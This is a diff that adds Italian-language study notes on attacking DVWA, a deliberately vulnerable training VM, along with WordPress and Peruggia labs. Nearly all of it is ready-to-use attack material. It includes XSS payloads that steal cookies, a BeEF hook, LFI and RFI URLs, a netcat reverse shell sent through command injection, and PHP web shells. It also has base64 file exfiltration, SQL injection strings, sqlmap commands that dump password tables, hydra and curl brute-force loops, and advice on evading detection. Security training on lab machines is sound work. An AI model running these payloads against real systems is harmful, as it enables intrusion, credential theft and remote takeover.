@@ -1,0 +1,166 @@
+Studio delle Vulnerabilità presenti sulla VM DVWA.
+
+VULNERABILITA'
+
+***Beef xss framework***
+	una volta avviato beef, sul terminale viene indicato uno script che deve essere inviato al server.
+	STEP:
+		1. copia lo script <script src="http://127.0.0.1:3000/hook.js"></script>
+		2. incollalo nel campo
+		3. fino a quando la tab della vittima resta aperta, beef puo' intercettare ed inoltrare exploit
+
+***XSS Reflected***
+	Ottengo nella stessa pagina il risultato dello script che passo
+	Nome<script>alert(ciao mondo!)</script>
+
+	LEVEL LOW:
+		<script>alert(document.cookie)</script>
+
+	LEVEL MEDIUM:
+		<ScRiPt>alert(document.cookie)</ScRiPt>
+		<IMG onerror="alert(document.cookie);" src=x />
+
+***XSS Stored***
+	Salvo il messaggio che inserisco e la risposta verra' visualizzata da tutti gli utenti che visitano la pagina.
+	<script>alert(document.cookie);</script>
+
+***XSS DOM***
+	DOM e' la risultante della pagina scritta dal programmatore
+
+	LEVEL LOW:
+	vado a scrivere direttamente nella url lo script
+	http://192.168.236.135/DVWA/vulnerabilities/xss_d/?default=English<script>alert(1)</script>
+
+
+***LFI***
+Consente di includere all'interno della pagina html qualsiasi file all'interno del file sistema
+	LEVEL LOW:
+		posso leggere il contenuto dei file di rete  -->  http://192.168.236.129/DVWA/vulnerabilities/fi/?page=/etc/passwd
+		mando in esecuzione un file esterno .php con una shell. Dando poi il comando "ls" leggo il contenuto della cartella.
+			http://192.168.236.135/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/hackable/uploads/mia_foto.php&cmd=ls
+			http://{URL della pagina }/{querystring}/{path del file malevolo}/comando malevolo
+
+LOG POISONING
+
+
+***RFI***
+	ci consente di includere all'interno della pagina html qualsiasi file presente su altri siti. Bisogna sottomettere un file txt in quanto, se mettiamo una pagina php, manderemo fuori il nostro output.
+	http://192.168.236.129/DVWA/vulnerabilities/fi/?page=http://miosito_evil/pagina.txt
+
+***RCE***
+localhost; nc -e /bin/bash mioIP PORTA//  127.0.0.1; nc -e /bin/bash 192.168.236.1 4000
+
+***FILE UPLOAD***
+https://www.owasp.org/index.php/Unrestricted_File_Upload
+
+Provo a caricare un file con un estensione diversa da quella indicata, o creo un file che esegua comandi remoti
+	crei una pagina .php con il seguente codice per vedere <?php  system("id"); ?>
+
+	***LIVELLO LOW***
+
+		***creo un file che contenga un comando che mi esegua una shell
+			<?php system($_GET["cmd"]);  ?>      --> la variabile $_GET assumera' il valore "cmd" e quindi potra' eseguire la  shell remota
+			nella url del browser gli mando il comando da assegnare alla GET (es. http://192.168.236.135/DVWA/hackable/uploads/mia_foto.php?cmd=ls)
+
+		***scaricare un file pdf salvato in una cartella del file system
+				http://192.168.236.135/DVWA/hackable/uploads/mia_foto.php?cmd=cat /var/www/html/file.pdf | base64 -
+				--> copio l'output e me lo incollo dentor un file in locale
+				cat file.enc | base64 -d - > pdf_scaricato.pdf
+
+	***LIVELLO MEDIUM***
+		intercetto la chiamata che la pagina fa al server e cambio il content type, passandogli il parametro "image/jpeg", cosi' da fargli capire che e' un'immagine
+
+
+***BRUTE FORCE***
+Livello low: hydra 192.168.236.133 -l admin -P rockyou.lst http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookie: security=low; PHPSESSID=t5rs893eioev471h2gdonf3e9o"
+
+Livello Medium: Aggiungere "-c" e l'indicazione del tempo in secondi
+
+
+
+***SQL-Inj***  (cheat sheet)
+
+SELECT * FROM users WHERE id=''
+	basta aggiungere un ' (apice) e vedere se l'applicazione mi da errore. Se mi da un errore, allora ho una sql-inj e posso sfruttarla
+	come condizione metto ' or '1'='1     -> mi restituisce 5 risultati
+	' UNION SELECT @@version #     -> mi fa vedere la versione di database che sto attaccando. in questo caso aggiungo il # per commentare  il fatto che aggiunge l'apice alla fine
+	' UNION SELECT @@version, @@hostname#   -> in questo modo ho la versione del db e il nome dell'hostname
+	' ORDER BY (numerocolonna) #
+	' union select user, password from users #    -> tento la select inserendo due campi casuali
+	' union select 1, load_file('/etc/passwd')#'   -> mi permette di vedere un file della macchina che ospita il db
+
+SQL-Inj Blind***
+
+	' or 1= sleep (5)#   -> invio il comando sleep che dice al db di aspettare 5 secondi prima di darmi la risposta
+
+	SQLMAP
+		sqlmap --help
+
+		sqlmap --url='http://192.168.1.24/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit' --cookie=' (cookie intero) ' -b
+
+		sqlmap --url='http://192.168.1.24/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit' --cookie=' (cookie intero) ' -D dvwa -T users --dump  -> sqlmap --url=' gli passo la url ' --cookie=' gli passo il cookie ' -D (nome del db) -T (nome della tabella) --dump
+
+		sqlmap --url=' url dell'applicazione ' --cookie=' cookie ' --passwords (tira giu' le password del database)
+
+
+***CSRF - Cross Site Request Forgery ***
+l'applicazione lato server non analizza da dove viene la richiesta.
+
+
+***WP SCAN***
+	esegue vulnerability assesment su macchine che hanno wordpress
+	wpscan --url http://[URL]
+	enumerare gli utenti  -->  wpscan --url http://192.168.1.12/wordpress --enumerate u
+	enumerare i temi  -->  wpscan --url http://192.168.1.12/wordpress --enumerate u t
+	all plugin  -->  wpscan --url http://192.168.1.12/wordpress --enumerate ap
+
+	abbassare il numero dei thread, per evitare di essere intercettato
+
+	***RFI su macchina OWASP - Wordpress***
+		creo un file wp-config.php con del contenuto malevolo <?php system("id;pwd;date;ls"); ?>
+		salvo il file sul mio webserver
+		disabilito il moduo php della mia macchina
+		http://192.168.1.12/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=http://192.168.1.32/
+
+
+
+***NOTE IMPORTANTI***
+abilitare modulo php -->   a2enmod php7.2
+
+disabilitare modulo php -->   a2dismod php7.2
+
+for VARIABILE in `cat password.txt`; do echo "$VARIABILE"; done     ->  controlla per ogni riga il contenuto del file e mi stampi a video il contenuto della variabile
+
+da Owasp Zap --> strumenti/opzioni/replacer
+
+
+***CLICKJACKING***
+la vittima apre la pagina contenente un form sul suo sito dell'attaccante. La pagina e' posizionata su una pagina con iframe e con 2 text box sopra le text-box originali.
+La vittima inserisce le credenziali e verra' reindirizzata al form corretto.
+
+***PATH TRAVERSAL***
+inserire il path "../../../../" all'interno del campo "filename" su ZAP. in questo modo navighi la directory
+
+
+***BRUTE FORCE***
+for PASSWORD in `cat password.txt`; do echo "Sto provando la password: $PASSWORD"; curl --cookie 'security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4' "http://192.168.236.135/DVWA/vulnerabilities/brute/?username=admin&password=$PASSWORD&Login=Login" | grep incorrect; echo; done
+
+	***TOOL***
+	hydra 	-->		hydra -l user -P passlist.txt ftp://192.168.0.1
+
+					hydra -U http-get-form
+
+					hydra -l (METTO L'USER) -P (NOME DEL FILE CON LE PASSWORD) -t (TENTATIVI SIMULTANEI) (IP DEL SERVER) http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4"
+
+					export HYDRA_PROXY_HTTP=http://localhost:8080   --> passo dal proxy
+
+	fuzzer
+
+	***LIVELLO LOW***
+	hydra -l admin -P password.txt -t 4 192.168.236.135 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4"
+
+	***LIVELLO MEDIUM***
+	hydra -l admin -P password.txt -t 4 192.168.236.135 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie: security=low; PHPSESSID=fdo6atckfp75hboui2pm4cf8t4"
+
+	***PERUGGIA***
+	hydra -l admin -P password.txt 192.168.236.132 http-post-form "/peruggia/index.php?action=login&check=1:username=^USER^&password=^PASS^:S=Logout"
